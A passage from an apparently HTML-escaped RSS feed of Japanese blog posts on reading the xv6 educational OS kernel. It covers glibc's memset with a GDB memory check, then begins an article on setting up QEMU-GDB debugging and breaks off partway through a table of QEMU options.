	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  dstp &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; OPSIZ&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  xlen &lt;span class=&quot;token operator&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      len &lt;span class=&quot;token operator&quot;&gt;%=&lt;/span&gt; OPSIZ &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;token comment&quot;&gt;/* Write 1 `op_t&apos; per iteration until less than OPSIZ bytes remain.  */&lt;/span&gt;
      xlen &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; OPSIZ&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;xlen &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  dstp &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; OPSIZ&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  xlen &lt;span class=&quot;token operator&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      len &lt;span class=&quot;token operator&quot;&gt;%=&lt;/span&gt; OPSIZ&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;/* Write the last few bytes.  */&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;len &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      dstp &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      len &lt;span class=&quot;token operator&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; dstpp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/lattera/glibc/blob/master/string/memset.c&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;glibc/memset.c at master · lattera/glibc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;は、任意のアドレス範囲に特定の値を高速に書き込むことができ、初期化などに使用されます。&lt;/p&gt;
&lt;p&gt;単純にforループなどで実装するよりも高速に動作するように実装されているようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/13327155/memset-definition-and-use&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c++ - Memset Definition and use - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xv6の&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;はglibのものよりかなり簡単な実装にはなっていますが、&lt;code class=&quot;language-text&quot;&gt;stosb&lt;/code&gt;命令や&lt;code class=&quot;language-text&quot;&gt;stosl&lt;/code&gt;を使用してforループよりも高速に動作するように実装されているようです。&lt;/p&gt;
&lt;p&gt;実際にgdbを使ってmemsetが動いていることを確認します。&lt;/p&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;の実行直前にブレークポイントを仕掛けます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ target remote localhost:26000
$ b memset
$ &lt;span class=&quot;token builtin class-name&quot;&gt;continue&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ブレークポイントを設定したので、ページの先頭アドレスから0x1000バイト分の中身をのぞいてみたところ、すべて0になっていました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# memset実行直前のメモリの状態を見る&lt;/span&gt;
$ x/1000 0x80116000
0x80116000:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; 中略 &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
0x80116f90:	0x00000000	0x00000000	0x00000000	0x00000000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;続いて&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;終了直後に同じメモリ領域をのぞいてみると、すべてのバイト値が1になっていることが確認できました。(4バイトごとに出力が区切られているのでわかりづらいですが。)&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# memset実行直後のメモリの状態を見る&lt;/span&gt;
$ finish
$ $ x/1000 0x80116000
0x80116000:	0x01010101	0x01010101	0x01010101	0x01010101
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; 中略 &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
0x80116f90:	0x01010101	0x01010101	0x01010101	0x01010101&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;ようやくカーネル本体に進みました。&lt;/p&gt;
&lt;p&gt;とはいえ&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数の1つ目の関数を読んだだけで結構なボリュームになってしまったので、続きは次の記事にまとめようと思います。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -GDBデバッグ環境構築編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルをロードする挙動を読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-003-setup-kernel-debug</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-003-setup-kernel-debug</guid><pubDate>Mon, 24 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;リバースエンジニアリングに強くなりたいのと、カーネルとかOSに詳しくなりたいと思っています。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;が結構重かったので、もう少し軽めのところから始めたいと思っていたところ、UNIX V6というOSがトータルで1万行くらいのコード量で、人類でもギリギリ理解できるということを知り、興味を持ちました。&lt;/p&gt;
&lt;p&gt;ただ、UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-002-load-kernel&quot;&gt;前回&lt;/a&gt;まででxv6OSのビルドと起動プロセスまで読み進めました。&lt;/p&gt;
&lt;p&gt;早速カーネル本体の動きを読み進めようと思ったのですが、コードを読むだけだとわからない箇所があったので、理解を深めるためにデバッグ環境を先に構成しようと思います。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#xv6os%E3%82%92qemu-gdb%E3%81%A7%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%99%E3%82%8B&quot;&gt;xv6OSをQEMU-GDBでデバッグする&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E6%99%82%E3%81%AEqemu%E3%81%AE%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3%E5%BC%95%E6%95%B0&quot;&gt;デバッグ時のQEMUのオプション引数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%82%92%E8%A9%A6%E3%81%99&quot;&gt;デバッグを試す&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;xv6osをqemu-gdbでデバッグする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#xv6os%E3%82%92qemu-gdb%E3%81%A7%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%99%E3%82%8B&quot; aria-label=&quot;xv6osをqemu gdbでデバッグする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;xv6OSをQEMU-GDBでデバッグする&lt;/h2&gt;
&lt;p&gt;基本的な手順は以下の記事が参考になりました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://qiita.com/ksky/items/974ad1249cfb2dcf5437&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6のデバッグ環境をつくる - Qiita&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;僕の環境ではQEMUのコンソールはGUIの別ウィンドウで使用したかったので、上記の記事とは異なり、&lt;code class=&quot;language-text&quot;&gt;qemu-nox-gdb&lt;/code&gt;ではなく&lt;code class=&quot;language-text&quot;&gt;qemu-gdb&lt;/code&gt;を使用しています。&lt;/p&gt;
&lt;p&gt;デバッガの接続方法は非常に簡単で、以下のコマンド実行するだけです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Makefileと同じディレクトリで実行する&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt; qemu-gdb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;続いて、別のターミナルを開き、以下のコマンドを入力するとデバッグが可能になります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# gdbでkernelバイナリをデバッグ対象に指定&lt;/span&gt;
gdb kernel

&lt;span class=&quot;token comment&quot;&gt;# gdbでリモートデバッグ&lt;/span&gt;
target remote localhost:26000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;まず、&lt;code class=&quot;language-text&quot;&gt;make qemu-gdb&lt;/code&gt;は、xv6OSをビルドした上で&lt;code class=&quot;language-text&quot;&gt;qemu-system-i386 -serial mon:stdio -drive file=fs.img,index=1,media=disk,format=raw -drive file=xv6.img,index=0,media=disk,format=raw -smp 2 -m 512  -S -gdb tcp::26000&lt;/code&gt;を呼び出します。&lt;/p&gt;
&lt;p&gt;QEMUのオプション引数については以下で順に見ていきます。&lt;/p&gt;
&lt;h3 id=&quot;デバッグ時のqemuのオプション引数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E6%99%82%E3%81%AEqemu%E3%81%AE%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3%E5%BC%95%E6%95%B0&quot; aria-label=&quot;デバッグ時のqemuのオプション引数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デバッグ時のQEMUのオプション引数&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;make qemu-gdb&lt;/code&gt;実行時に使用されるオプション引数は以下の通りです。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;オプション引数&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;用途&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-serial &lt;dev&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;仮想シリアルデバイスをホストにリダイレクトする&lt;br /&gt;&lt;code class=&quot;language-text&quot;&gt;mon:stdio&lt;/code&gt;の設定ではターミナルにコンソールとQEMU monitorを表示させる&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-drive &lt;options&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;ブロックデバイスやインターフェースなどの新しいデバイスを追加する&lt;br /&gt;今回は&lt;code class=&quot;language-text&quot;&gt;xv6.img&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;fs.img&lt;/code&gt;をそれぞれdiskとして読み込んでいる&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-smp &lt;cpus&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;指定した数のCPUを使用してSMP(マルチプロセッサシステム)をエミュレーションする&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-m &lt;MB or GB&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;仮想マシン起動時のメモリサイズを指定(デフォルト単位：MB)&lt;br /&gt;&lt;code class=&quot;language-text&quot;&gt;1G&lt;/code&gt;のように接頭辞を付けることでギガバイト単位に変更可能&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-S&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;起動時にCPUを使用しない(=電源投入直後の時点で停止し、gdbの接続を待機させる)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
